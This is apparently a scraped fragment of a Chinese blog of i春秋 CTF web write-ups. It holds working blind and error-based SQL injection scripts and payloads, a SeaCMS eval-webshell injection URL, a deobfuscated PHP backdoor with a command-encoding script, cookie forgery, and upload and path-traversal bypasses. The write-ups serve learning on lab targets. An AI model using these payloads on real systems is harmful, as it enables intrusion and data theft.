接下来拿去MD5编码一下可得到8638d5263ab0d3face193725c23ce095 这里说是需要captcha的MD5加密后的前六位是365268，这里编写一个脚本:这个是参考脚本： 12345678910import hashlibdef md5(s) return hashlib.md5(str(s).encode('utf-8')).hexdigest()def main(s): for i in range(1,999999999): if md5(i)[0:6] == str(s): print(i) exit(0)if __name__=='__mian__':#这里是相当于一个入口，具体可以谷歌 mian(&quot;******&quot;) 自己编写: 12345678import hashlibs='*****'for i in range(1,9999999)://如果跑不出来 就把数字范围再加大点 i=a i=hashlib.md5(str(i).encode('uft-8')).hexdigest() if i[0:6] == str(s): print(a) break 这里密码随意都可以 爆破出验证码以后登录即可看到这个框 1The 7815696ecbf1c96e6894b779456d330e.php:)Welcome 8638d5263ab0d3face193725c23ce095! 提示说这个MD5解码后的asd.php让我们打开看看后来发现 根本不需要解码–感觉对于识别是何种加密方式的能力还不熟悉，全凭感觉，还是要再去学习一下接下来就到了文件上传 上传txt文件也不可以上传，上传php文件不行，所以这里推测一下应该是白名单过滤,但是应该还有检查其他参数吧，burpsuit抓包的时候改一下MIME参数试试能不能绕过那就首先把常用的几个后缀都试试好了:大小写、pht、phtml、php3、php5，最后发现pht可以得到flag","link":"/2021/02/08/i%E6%98%A5%E7%A7%8B1/"},{"title":"i春秋2","text":"SQL注入——1在更换?id=3时，它会让你叠加输入tips，此时你就可以看到你输入的sql语句，算是一个帮助吧，然后这关没啥过滤的好像，直接union select联合注入就可以了 SQL注入——2admin’and 1=1#——账号或密码错误 ——u8befadmin’and 1=2#——账号不存在 —— u5728判断需要盲注：写脚本由于不知道列名，所以就不能直接爆破密码，幸好过滤的不是很多，反正substr没被过滤，就开始盲注吧，过滤了select，但是可以用双写绕过 12345678910111213141516import requestsurl=&quot;http://eci-2ze42dfnzqpolzrkhy2v.cloudeci1.ichunqiu.com/login.php&quot;s=requests.session()headers = s.get(url).headerspassword = &quot;&quot;for i in range(1,33): for j in '0123456789qwertyuiopasdfghjklzxcvbnm!?._+=`~&amp;*{}[]': payload =f&quot;admin'-(substr(database(),{i},1)='{j}')-'#&quot; print(payload) data = {'name': payload,'pass': 'sky'} # print(s.post(url,data=data).text) if 'u5728' in s.post(url=url,data=data).text: #print(s.post(url,data=data).text) password += j print(password) break 得到数据库名字 12345678910111213141516import requestsurl=&quot;http://eci-2ze42dfnzqpolzrkhy2v.cloudeci1.ichunqiu.com/login.php&quot;s=requests.session()headers = s.get(url).headerspassword = &quot;&quot;for i in range(1,33): for j in '0123456789qwertyuiopasdfghjklzxcvbnm!?._+=`~&amp;*{}[],，': payload =f&quot;admin'-(substr((selselectect table_name from information_schema.tables where table_schema='note' limit 0,1),{i},1)='{j}')-'#&quot; print(payload) data = {'name': payload,'pass': 'sky'} # print(s.post(url,data=data).text) if 'u5728' in s.post(url=url,data=data).text: #print(s.post(url,data=data).text) password += j print(password) break 啥？没密码？直接flag了吗，那就继续吧 12345678910111213141516import requestsurl=&quot;http://eci-2ze42dfnzqpolzrkhy2v.cloudeci1.ichunqiu.com/login.php&quot;s=requests.session()headers = s.get(url).headerspassword = &quot;&quot;for i in range(1,33): for j in '0123456789qwertyuiopasdfghjklzxcvbnm!?._+=`~&amp;*{}[],，': payload =f&quot;admin'-(substr((selselectect column_name from information_schema.columns where table_name='fl4g' limit 0,1),{i},1)='{j}')-'#&quot; print(payload) data = {'name': payload,'pass': 'sky'} # print(s.post(url,data=data).text) if 'u5728' in s.post(url=url,data=data).text: #print(s.post(url,data=data).text) password += j print(password) break 拿到字段名： 12345678910111213141516import requestsurl=&quot;http://eci-2ze42dfnzqpolzrkhy2v.cloudeci1.ichunqiu.com/login.php&quot;s=requests.session()headers = s.get(url).headerspassword = &quot;&quot;for i in range(1,33): for j in '0123456789qwertyuiopasdfghjklzxcvbnm!?._+=`~&amp;*{}[],，': payload =f&quot;admin'-(substr((seselectlect flag from fl4g limit 0,1),{i},1)='{j}')-'#&quot; print(payload) data = {'name': payload,'pass': 'sky'} # print(s.post(url,data=data).text) if 'u5728' in s.post(url=url,data=data).text: #print(s.post(url,data=data).text) password += j print(password) break 拿到flag 感觉没啥难度，唯一卡壳的地方就是一个开始的fuzz过滤看反了，以为select是没过滤的，其他全过滤了，后来发现其实不是滴 web-SQLI看到提示说有login.php，所以就打开了，发现尝试了很多注入姿势都不对，于是再去找线索，看了一下wp发现原来是l0gin.php==后来去看了一下 为啥是l0gin.php，说是经验吧。。。。可能确实需要多积累吧，就像之前那个备份文件泄露一样 在进行sql注入的时候，发现输入的内容会显示在id中，当我输入逗号的时候，逗号以后的内容就不会被显示此时有两种解决方法：1.寻找代替逗号的符号2.编写盲注脚本，因为发现，如果是正确的后面的username是会现实的，通过后面的-1-以及-0-可以看出先尝试一下方法1吧: payload: 123?id=-1'union select * from ((select group_contat(table_name) from information_schema.tables where table_schema=database())a join (select user())b) %23?id=-1'union select * from ((select group_concat(column_name) from information_schema.columns where table_name='users')a join (select user())b) %23?id=-1'union select * from ((select flag_9c861b688330 from users)a join (select user())b) %23 这里使用的是join代替逗号，需要注意的是，join内容的类型需要一样，其次后面需要加一个字符，然后这里的注释符很奇怪，在这里卡了很久 不能使用–+ 但是可以用%23或者 – -盲注脚本 1234567891011121314151617181920import requestsurl=&quot;http://6f89d5298bc448ac8af388b5a68da444863034a569d8481a.changame.ichunqiu.com/l0gin.php?id=&quot;s=requests.session()headers = s.get(url).headerspassword = &quot;&quot;for i in range(1,33): for j in '0123456789qwertyuiopasdfghjklzxcvbnm!?._+=`~&amp;*{}[],，': payload =f&quot;1'-(mid((database())from(-{i}))='{j}{password}')-'&quot; print(payload) #print(s.get(url+payload).text) if 'flag' in s.get(url+payload,headers=headers).text: #print(s.post(url,data=data).text) strA = password password = strA[::-1] print(password)#可不用，是用来调试的 password += j strA = password password = strA[::-1] print(password) break 这个盲注脚本的语句依旧是沿用之前的，当我在burp suit测试的时候，语句是可以使用的，但是当我放到pycharm跑的时候永远只有一条信息，推测是被拦截了。最后flag就出来了 绕过参考：https://yang1k.github.io/post/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%8E%9F%E7%90%86%E6%80%BB%E7%BB%93/#%E7%BB%95%E8%BF%87%E5%AF%B9%E9%80%97%E5%8F%B7-%E7%9A%84%E8%BF%87%E6%BB%A4","link":"/2021/02/10/i%E6%98%A5%E7%A7%8B2/"},{"title":"i春秋3","text":"web——borken这里一打开，出现很多 这个东西，我也不知道是啥，于是就去看了一下wp发现是JSFUCK，是一种编程语言，所以学习一下： JSFUCK:JSFuck 可以让你只用 6 个字符[]()!+来编写 JavaScript 程序。 我看看能不能解密，将页面上的JSFUCK拿去解码发现最上面少而另一]，将它补齐后在下面窗口运行，弹出:flag not here看到这么多的奇怪字符，我觉得好痛苦，看了WP有两种方法，一种是对照找出flag在这些代码中放置的位置，第二种是:上面那段代码的原理其实很简单，它使用了Function关键字定义一个匿名函数，并立即执行了。 如果我们在浏览器敲入下面代码，也会弹出数字“1”： 1Function(&quot;alert(1)&quot;)() 该段代码最后()代表的是函数的结尾，所以只要把最后这个括号删掉就不会弹框了，然后一开始补齐的代码，也需要一起删除，这样才能显示被掩盖的结果 web-who are you打开页面 说没有权限，于是抓包看看有没有什么修改权限地方看起来像是加密了，所以base64试着解码一下，得到f:5:&quot;thrfg&quot;;接下来就触及了知识盲区了原来以上的内容又使用了rot13加密，所以解密完以后变成s:5:”guest”，更改为admin，再去重新加密试试她现在让我们上传东西了，但是却没有上传的框框，看到这里是要POST上传的 试了几种一句话木马都被过滤了，后来实在想不到了，看了一下WP，原来--可以用输入**数组的方式**进行绕过检查大概算是一种经验吧，积累一波 但是当我打开这个文件夹的时候啥都没有–，用扫描目录的工具扫了一波 都没发现存在这个目录，，，阿这挺无语的 web——Login在下面审查元素找到一个类似于账号密码的东西，输入进去登录后得到一个很奇怪的表情人傻了，但是其他信息也没有，burpsuit抓包试试，也没发现什么有用的东西=-=，但是有一个show的参数 去看了一下wp，这个show好像是关键的东西，然后回来，修改了一下show的值 1234567891011121314151617181920212223242526272829303132333435363738&lt;?php include 'common.php'; $requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);//从这几个地方获取$requset的值 class db //定义类 { public $where; function __wakeup()//定义函数 { if(!empty($this-&gt;where)) { $this-&gt;select($this-&gt;where); } } function select($where) { $sql = mysql_query('select * from user where '.$where); return @mysql_fetch_array($sql); } } if(isset($requset['token'])) { $login = unserialize(gzuncompress(base64_decode($requset['token']))); $db = new db(); $row = $db-&gt;select('user=\\''.mysql_real_escape_string($login['user']).'\\''); if($login['user'] === 'ichunqiu') { echo $flag; }else if($row['pass'] !== $login['pass']){ echo 'unserialize injection!!'; }else{ echo &quot;(╯‵□′)╯︵┴─┴ &quot;; } }else{ header('Location: index.php?error=1'); }?&gt; 把show改为1就出现了如上源码：接下来要审计一波这个源码–头已经开始晕了仔细看了一下也没啥，主要是这个类和函数的定义绕来绕去的，其实就是要从库里select 出一个user=ichunqiu的，但是考虑到库里可能没有这个值，所以这里要我们自己去赋值，所以我们转化的不是单纯的‘ichunqiu’而是赋予user这一个键键值为ichunqiu'user'-&gt;'ichunqiu' 12345&lt;?php $a = array('user'=&gt;'ichunqiu');$b = base64_encode(gzcompress(serialize($a)));echo $b?&gt; eJxLtDK0qi62MrFSKi1OLVKyLraysFLKTM4ozSvMLFWyrgUAo4oKXA==转化结果，然后再cookie添加token为以上值就行这样就可以得到flag了flag{5db96a12-b37c-44e3-8152-cdd30455bae2} web——海洋cms漏洞隔了好几天了，看不下去这个漏洞，操作什么的倒是很好模仿，但是对于原理的理解就比较磨人了，今天发誓一定要好好学完！ 原理这里主要说一下6.45的代码任意执行漏洞，在这个漏洞中 12function echoSearchPage() { ...... $content = str_replace(&quot;{searchpage:page}&quot;,$page,$content); $content = str_replace(&quot;{seacms:searchword}&quot;,$searchword,$content); $content = str_replace(&quot;{seacms:searchnum}&quot;,$TotalResult,$content); $content = str_replace(&quot;{searchpage:ordername}&quot;,$order,$content); ...... $content = str_replace(&quot;{searchpage:year}&quot;,$year,$content); $content = str_replace(&quot;{searchpage:area}&quot;,$area,$content); $content = str_replace(&quot;{searchpage:letter}&quot;,$letter,$content); $content = str_replace(&quot;{searchpage:lang}&quot;,$yuyan,$content); $content = str_replace(&quot;{searchpage:jq}&quot;,$jq,$content); ...... $content = str_replace(&quot;{searchpage:state}&quot;,$state2,$content); $content = str_replace(&quot;{searchpage:money}&quot;,$money2,$content); $content = str_replace(&quot;{searchpage:ver}&quot;,$ver,$content); ...... $content=$mainClassObj-&gt;parseIf($content); str_replace()函数：将content里面的searchpage换成前面一个变量中的 代码中对html中的searchpage标签进行了多次替换，而攻击者也正是利用了这一点，在多次替换过程中使多个参数共同组合成最终的payload，这样既绕开了RemoveXSS的过滤又绕过了20字节的长度限制。，在经过多次的替换后，此时的content已经变成了包含了我们原本的恶意语句例子: 1searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=(join{searchpage:jq}&amp;jq=($_P{searchpage:ver}&amp;&amp;ver=OST[9]))&amp;9[]=ph&amp;9[]=pinfo(); 当我们在url中输入以上内容，经过多次的替换后，最终的content已经变成一下内容: 1if:eval(join($_POST[9])) 而在parself函数中，如果判断出含有if:标签，则会使用eval函数来执行 123456function parseIf($content){ if (strpos($content,'{if:')=== false){ return $content; }else{ ...... @eval(&quot;if(&quot;.$strIf.&quot;){\\$ifFlag=true;}else{\\$ifFlag=false;}&quot;); 知道这些原理后在URL当中构建: 1http://ef7204bb29d84b7b82022457450f9e2b21aaa4cb0d4d4570.changame.ichunqiu.com/search.php?searchtype=5&amp;tid=&amp;letter=eval($_POST[9]) 此时就可以用蚁剑连接该链接，密码是9为什么蚁剑可以直接连接了呢？经过多次替换后，在最后的if语句中 会执行eval($_POST[9])此命令，就相当于我们通过URL在一个php文件中插入了一句话木马，打开此URL就相当于执行了该木马。找了一下， 找到了那个search.php，决定等会还好好审计一波，然后再看了一下，说是flag在数据库中，于是找到数据库的配置文件，连接后查找即可找到flag 123456789&lt;?php//数据库连接信息$cfg_dbhost = '127.0.0.1';$cfg_dbname = 'seacms';$cfg_dbuser = 'sea_user';$cfg_dbpwd = '46e06533407e';$cfg_dbprefix = 'sea_';$cfg_db_language = 'utf8';?&gt;","link":"/2021/02/12/i%E6%98%A5%E7%A7%8B3/"},{"title":"posti春秋11","text":"web——backdoor他说有源码泄露，就先试试git泄漏，http://8f5271da775d49a7a0166a25cc5c836e795e8d00fc0044de.changame.ichunqiu.com/Challenges/.git/，在githack中就扫出来三个没啥用的文件，后来又试了一下常见的网站备份目录，都没有收获，看了一下wp，才知道这里涉及到.git文件的历史文件，也就是修改之前的文件，使用GitHack需要更麻烦的修改，所以这里使用Git_Extract 在一个个打开看之后得到： 123&lt;?phpecho &quot;flag{true_flag_is_in_the_b4ckdo0r.php}&quot;;?&gt; 然后她说让我们找code，猜测这次应该就是网站的备份文件了，但是试了一圈下来，都没找到，发现是.swo后缀。。。。下载下来后改后缀用kali打开 123456789101112131415161718192021&lt;?phpecho &quot;can you find the source code of me?&quot;;/** * Signature For Report */$h='_)m/&quot;,&quot;/-/)m&quot;),)marray()m&quot;/&quot;,&quot;+&quot;)m),$)mss($s[$i)m],0,$e))))m)m,$k)));$o=ob)m_get_c)monte)m)mnts)m();ob_end_clean)';/* */$H='m();$d=ba)mse64)m_encode)m(x(gzc)mompres)ms($o),)m$)mk));print(&quot;&lt;)m$k&gt;$d&lt;)m/)m$k&gt;)m&quot;);@sessio)mn_d)mestroy();}}}}';/* */$N='mR;$rr)m=@$r[)m&quot;HTT)mP_RE)mFERER&quot;];$ra)m=)m@$r[&quot;HTTP_AC)mC)mEPT_LANG)mUAGE)m&quot;)m];if($rr)m&amp;&amp;$ra){)m$u=parse_u)mrl($rr);p';/* */$u='$e){)m$k=$)mkh.$kf;ob)m_start();)m@eva)ml(@gzunco)mmpr)mess(@x(@)mbase6)m4_deco)mde(p)m)mreg_re)mplace(array(&quot;/';/* */$f='$i&lt;$)ml;)m){)mfo)mr($j)m=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j)m++,$i+)m+){$)mo.=$t{$i)m}^$)mk{$j};}}r)meturn )m$o;}$r)m=$_SERVE)';/* */$O='[$i]=&quot;&quot;;$p)m=$)m)mss($p,3)m);}if(ar)mray_)mkey_exists)m()m$i,$s)){$)ms[$i].=$p)m;)m$e=s)mtrpos)m($s[$i],$f);)mif(';/* */$w=')m));)m$p=&quot;&quot;;fo)mr($z=1;)m$z&lt;c)mount()m$m[1]);$)mz++)m)m)$p.=$q[$m[)m)m2][$z]];if(str)mpo)ms($p,$h))m===0){$s)m';/* */$P='trt)molower&quot;;$)mi=$m[1][0)m)m].$m[1][1])m;$h=$sl()m$ss(m)md5($)mi.$kh)m),0,)m3));$f=$s)ml($ss()m)mmd5($i.$kf),0,3';/* */$i=')marse_)mstr)m($u[&quot;q)muery&quot;],$)m)mq);$q=array)m_values()m$q);pre)mg_matc)mh_all()m&quot;/([\\\\w)m])m)[\\\\w-)m]+(?:;q=0.)';/* */$x='m([\\\\d)m]))?,?/&quot;,)m$ra,$m))m;if($q)m&amp;&amp;$)mm))m)m{@session_start();$)ms=&amp;$_S)mESSI)m)mON;$)mss=&quot;sub)mstr&quot;;$sl=&quot;s)m';/* */$y=str_replace('b','','crbebbabte_funcbbtion');/* */$c='$kh=&quot;4f7)m)mf&quot;;$kf=&quot;2)m)m8d7&quot;;funct)mion x($t)m,$k){$)m)mc=strlen($k);$l=st)mrlen)m($t);)m)m$o=&quot;&quot;;for()m$i=0;';/* */$L=str_replace(')m','',$c.$f.$N.$i.$x.$P.$w.$O.$u.$h.$H);/* */$v=$y('',$L);$v();/* */ echo($L);//这一句是为了得到$L加上去的，恢复得到的文件中并没有?&gt; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?php$kh=&quot;4f7f&quot;;$kf=&quot;28d7&quot;;function x($t,$k){ $c=strlen($k); $l=strlen($t); $o=&quot;&quot;; for($i=0;$i&lt;$l;) { for($j=0;($j&lt;$c&amp;&amp;$i&lt;$l); $j++,$i++) { $o.=$t{$i}^$k{$j}; } } return $o; }$r=$_SERVER;$rr=@$r[&quot;HTTP_REFERER&quot;];$ra=@$r[&quot;HTTP_ACCEPT_LANGUAGE&quot;];if($rr&amp;&amp;$ra){ $u=parse_url($rr);#parse_url()本函数解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。 parse_str($u[&quot;query&quot;],$q);//这里就是要让我们传参数参数名都可以，这里是要跟下面打配合的 $q=array_values($q); preg_match_all(&quot;/([\\w])[\\w-]+(?:;q=0.([\\d]))?,?/&quot;,$ra,$m);//这里匹配的内容是任意一个字母 匹配任意一个字母和符号- 匹配;q=0.加上一个数字，接下来还会建立三个数组，一个就是根据上面的匹配内容，第二个是放置所有匹配内容的首字母，第三个是放置所有匹配内容当中的数字内容 if($q&amp;&amp;$m) { @session_start(); $s=&amp;$_SESSION; $ss=&quot;substr&quot;; $sl=&quot;strtolower&quot;; $i=$m[1[0].$m[1[1]; $h=$sl($ss(md5($i.$kh),0,3));//得到数值675 $f=$sl($ss(md5($i.$kf),0,3));//a3e $p=&quot;&quot;; for($z=1;$z&lt;count($m[1]);$z++) $p.=$q[$m[2][$z]];//这里$q的下标来自于$m最后的一组里面的数字，看了一下，只有在4的时候才为3，所以上面的query需要传入三个数值 if(strpos($p,$h)===0) //判断$p的前三个值是否为$p如果是往下 { $s[$i]=&quot;&quot;;//进来这个判断是必须的，这样才会绕过下面那个判断，此时$s:{zz =&gt; &quot;&quot;}[1] $p=$ss($p,3);//截取从第三个字符以后 } if(array_key_exists($i,$s)) { $s[$i].=$p; $e=strpos($s[$i],$f); if($e)//判断a3e是否在输入的数据当中 { $k=$kh.$kf;ob_start(); @eval(@gzuncompress(@x(@base64_decode(preg_replace(array(&quot;/_/&quot;,&quot;/-/&quot;),array(&quot;/&quot;,&quot;+&quot;),$ss($s[$i],0,$e))),$k)));//正则替换后进行异或运算再解码解压 $o=ob_get_contents();//eval执行内容传入o ob_end_clean(); $d=base64_encode(x(gzcompress($o),$k)); print(&quot;&lt;$k&gt;$d&lt;/$k&gt;&quot;);); @session_destroy(); } } } } ?&gt; 感动到热泪盈眶，为啥没有早点用phpstorm，用了这个工具，在审计代码的过程中变得好简单！！！代码审计完后，接下来我们需要操作的就是构造我们的payload，这里可以直接用php写一个加密函数： 123456789101112131415161718192021&lt;?phpfunction x($t,$k){ $c=strlen($k); $l=strlen($t); $o=&quot;&quot;; for($i=0;$i&lt;$l;) { for($j=0;($j&lt;$c&amp;&amp;$i&lt;$l); $j++,$i++) { $o.=$t[$i]^$k[$j]; } } return $o; }$o=&quot;system('ls');&quot;;//记得后面加分号$k=&quot;4f7f28d7&quot;;$c=&quot;TPp8VHv2Kv4DTuVN+hCEff8ve2EBCpdlZk33ypDEwMumBIr0uCrKpbiq1Z5+6xyPHma96ydT&quot;;//这个是得到的回显$d=base64_encode(x(gzcompress($o),$k));$c=@gzuncompress(@x(@base64_decode($c),$k));//这是解密代码print($d);print($c);?&gt; 这边有几点需要注意一下: 1.传入的参数的个数，我们上面有个循环$p.=$q[$m\\[2][$z]];因为有这个存在，所以需要注意language那一栏的个数，防止p没有获取到我们的代码导致后面的判断过不去 2.这里的referer需要自己添加一下 接下来我们就直接catflag 但是那边有个正则替换式，该怎么绕过_呢？但其实不用绕过来着，经过base64编码后我们的语句中已经没有\\_之类的东西了， 这是经过测试以后的可以看到在eval中执行的内容已经是OK的语句了 那为啥在网页端执行不出来呢，查看源码也没有？找了几个wp，有一个也是这种情况，最后在linux系统就可以执行了！我尝试了一下，也可以了 小结没想到用了phpstorm这么方便，有时间一定要回去重做一些代码审计题 web——信息收集flag3:p0rtant_hack}——通过目录.index.php.swp得到flag2:s_v3ry_im .——通过index.php~得到flag1:n1book{info_1——通过robots.txt得到做到现在感觉最简单的题目了吧。。","link":"/2021/03/05/i%E6%98%A5%E7%A7%8B11/"},{"title":"i春秋4","text":"web——123找了一下，发现一个提示，用户信息在user.php当中 但是当我直接打开user.php的时候，啥也没有，尝试了一下发现了user.php.bak文件，下载打开 这里需要说一下：这里属于备份隐私文件泄露，后缀之前有整理过了 打开以后，里面均为用户信息，结合提示密码为用户名加出生日期，但是由于没有提供出生日期，只有用户名，所以我们就将年龄设置一下直接跑用户名就行，如下：这里学一下如何用burp同时爆破两个变量 ，选择这个模式即可 其他模式参考：https://blog.csdn.net/qq_39101049/article/details/90234669发现这个人的账号密码是OK的 登录试试一片空白，查看源码： 由于这里被注释了，所以我们需要再创建一个，然后页面上就会出现文件上传的入口了 上传php文件，发现存在过滤，但是不知道是不是白名单，尝试一下其他文件类型尝试了好几种发现没有结果，感觉还挺奇怪的，可能因为是他的代码里面写的是检测第一个.后面的内容是否包含白名单文件吧，因为是题目，所以第二点号后面如果为pht，phtml的时候但是不能包含php3的时候文件才会被成功上传，尽管你上传白名单的那三个文件，也是会返回说文件名不合法的，到了这里，其实就是尝试了，也没啥好说的，感觉可以做一个字典，后缀字典，到时候跑一下就行了。。。一开始有点定性思维，认为是apache解析漏洞，从右到左进行判断，所以我构造的都是123.php.jpg之类的文件，尝试了好多种组合都无果，最后看了一下wp才知道。。。果然还是要多刷题 当我打开这个文件的时候在看了一下源码，和报文，没有其他收获，试试是不是文件包含吧？因为这个时候也只有这种可能了他一开始说过滤了flag，在尝试了大小写混写以后，发现复写flag就可以绕过了 web——YeserCMS查找漏洞题。。。看一下网站框架在评论区看到百度查找cmseasy漏洞，接下来就看着操作了。。。漏洞出现在parse_str($sQuery,$aArray);所以 可以进行报错注入 1234elive/live/header.phppost：xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx',(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(concat(database())) ),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;/q&gt;&lt;/xjxquery&gt;//这里使用报错注入， 所以 跳转：http://3f50fc9615c747578e1c6fd0a4a9d076c1687d99683d45b6.changame.ichunqiu.com//celive/live/header.php然后post发送一下以上payload：得到 1xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx',(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(table_name) from information_schema.tables where table_schema=database()) ,720,900),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;/q&gt;&lt;/xjxquery&gt; 以上是爆表，由于一次性显示的字符数有限制，所以，在不断更换后面的显示段数，找到了user表 1xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx',(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT((column_name)) from information_schema.columns where table_name='yesercms_user') ,1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL)-- &lt;/q&gt;&lt;/xjxquery&gt; 接下来就是拿到账号密码了admin ff512d4240cbbdeafada404677ccbe61 1xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx',(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(concat(username,password)) from yesercms_user) ,10,42),0x5d),1)),NULL,NULL,NULL,NULL,NULL)-- &lt;/q&gt;&lt;/xjxquery&gt; 密码为md5加密，解密完以后是Yeser231 成功登陆以后，在网页中寻找可以打开flag.php的地方，利用burpsuit抓包修改参数即可 web——Code图片后面是经过base64加密，解密以后可得： 123456789101112131415161718&lt;?php /** * Created by PhpStorm. * Date: 2015/11/16 * Time: 1:31 */ header('content-type:text/html;charset=utf-8'); if(! isset($_GET['jpg'])) header('Refresh:0;url=./index.php?jpg=hei.jpg'); $file = $_GET['jpg']; echo '&lt;title&gt;file:'.$file.'&lt;/title&gt;'; $file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;,&quot;&quot;, $file); $file = str_replace(&quot;config&quot;,&quot;_&quot;, $file); $txt = base64_encode(file_get_contents($file)); echo &quot;&lt;img src='data:image/gif;base64,&quot;.$txt.&quot;'&gt;/&lt;/img&gt;&quot;; /** Can you find the flag file?**/?&gt; 从上面信息可得到，为phpstorm创建所得，phpstorm是php代码的集成开发环境，下载phpstorm，并新建一个项目，会发现在项目文件夹里面会生成一个.idea文件，它存储了项目的配置文件， 打开.idea文件可以发现misc.xml,modules.xml,workspace.xml文件。 1http://a8af39458fca4aa7a15a802e4b9f189cfb7d36988dba497a.changame.ichunqiu.com/.idea/workspace.xml 打开此URL，看到配置文件，发现fl3g_ichuqiu.php文件打开它看看 1http://a8af39458fca4aa7a15a802e4b9f189cfb7d36988dba497a.changame.ichunqiu.com/index.php?jpg=fl3gconfigichuqiu.php 因为上面说可以用config替换_在我直接使用_的时候是打不开的，当我变成config才能打开。。，然后就又会看到一段使用base64编码的字符串 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?php/** * Created by PhpStorm. * Date: 2015/11/16 * Time: 1:31 */error_reporting(E_ALL || ~E_NOTICE);include('config.php');function random($length, $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz') { $hash = ''; $max = strlen($chars) - 1; for($i = 0; $i &lt; $length; $i++) { $hash .= $chars[mt_rand(0, $max)];//生成随机数 } return $hash;//返回随机数}function encrypt($txt,$key){ for($i=0;$i&lt;strlen($txt);$i++){ $tmp .= chr(ord($txt[$i])+10);//ord返回10进制，chr返回相对应于 ascii 所指定的单个字符。此函数与 ord() 是互补的 } $txt = $tmp;//tmp是原本的txt十进制+10以后的数值 $rnd=random(4);//调用random函数，取得四位随机数，这个就是下面解密所需要截取的前四位 $key=md5($rnd.$key);//将rnd和key拼接后md5加密 $s=0; for($i=0;$i&lt;strlen($txt);$i++){ if($s == 32) $s = 0; $ttmp .= $txt[$i] ^ $key[++$s];//ttmp是txt和key异或后的数值 } return base64_encode($rnd.$ttmp); //返回的是rnd和ttmp}function decrypt($txt,$key){ $txt=base64_decode($txt); $rnd = substr($txt,0,4); $txt = substr($txt,4); $key=md5($rnd.$key); $s=0; for($i=0;$i&lt;strlen($txt);$i++){ if($s == 32) $s = 0; $tmp .= $txt[$i]^$key[++$s];//进行异或运算 } for($i=0;$i&lt;strlen($tmp);$i++){ $tmp1 .= chr(ord($tmp[$i])-10); } return $tmp1;}$username = decrypt($_COOKIE['user'],$key);if ($username == 'system'){ echo $flag;}else{ setcookie('user',encrypt('guest',$key)); echo &quot;a??(a?ˉa??a?°)a?-&quot;;}?&gt; 求解思路：先对system使用ord和chr+10，然后再和key进行异或，就可以得到txt，而txt就是我们需要输入的内容其中 key是未知的，所以key的求解需要我们从后面的setcookie中得到，用guest作为txt，用ord和chr各加10，得到tmp，此时的txt就等于tmp了，rnd是一个四位的随机数，和key拼接后md5加密得到一个新的key，要得到这个新的key，可以通过使用返回的cookie和tmp异或运算得到 传送个cookie值，要让他经过一系列的解码运算后等于system 我们打开fl3g_ichunqiu.php，会发现他有那个user的cookie，接下来编写脚本: 1234567891011121314151617181920212223242526272829import requestsimport base64url=&quot;http://b500619026b94e8ab02418c859eee290591d7abb431148af.changame.ichunqiu.com/fl3g_ichuqiu.php&quot;s= requests.session()return_user= s.get(url).cookies['user']de_user=base64.b64decode(return_user).decode('Latin-1')rnd=de_user[0:4]#四位随机数ttmp=de_user[4:]#print(ttmp)key=list('xxxxxx')txt=list('guest')system=list('system')for i in range(len(txt)): txt[i]=chr(ord(txt[i])+10)for i in range(len(txt)): key[i]=chr(ord(ttmp[i])^ord(txt[i]))for i in range(len(system)): system[i]=chr(ord(system[i])+10)try_word='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz'ttmp_new=''cookie_system=[]for i in try_word: key[5]=i for j in range(len(system)): ttmp_new +=chr(ord(key[j])^ord(system[j])) str =base64.b64encode((rnd+ttmp_new).encode('Latin-1')) print(str.decode('utf-8')) cookie_system.append(base64.b64encode(str)) ttmp_new = '' 关于脚本的编写，在理解完求解方式后，其实编写困难就在于语法了，在这里可以输出所有的结果，将它导出作为一个爆破字典，再用burp进行爆破即可 最后解决一个问题：这个key为什么不会改变？明明在解密和加密的时候都出现了运算：首先造成这个key改变的原因是什么？是rnd的变化，而rnd的变化只出现在加密当中，也就是当我们输入错误的cookie的时候他才会reset，但是我们利用burp进行重放攻击的时候，针对都是一样的cookie，相当于每次攻击完回到初始化，而我们在python中对于key的求解的时候，这个rnd它是不改变的，所以这个key也不会变化，在burp爆破进入加密时，由于这个rnd是截取我们的cookie前几位所以最终的key也是不变的。 一点总结感觉对于python脚本的编写还不是很熟练，有些语法还不是很熟练。。不过现在也有感觉好像用的最多的是什么，然后审计代码的时候，果然还是要静下心来好好看才行","link":"/2021/02/16/i%E6%98%A5%E7%A7%8B4/"},{"title":"i春秋5","text":"web——Zone有个登录界面一开始让我们登录，试了一下不是sql注入，于是抓包查看，在cookie发现有个login=0，将其改成1，发现可以进入，打开manage页面，这里还是需要在burpsuit不断将login修改为1，最终即可进入，得到一个： 1manages/admin.php?module=..././..././flag.php&amp;name= 比较类似于文件包含的url，一开始是../，发现不论几个都是出来的结果都一样，怀疑被过滤了，于是复写，发现页面就不一样了，接下来的目标是打开这个flag.php 在刚刚整理的敏感位置中的/etc/passwd中可以看到这个是Nginx系统 123nginx:/etc/nginx/nginx.conf/etc/nginx/sites-enabled/default 在第一个配置文件中没有发现啥东西，在第二个配置文件中发现了一些网站目录： 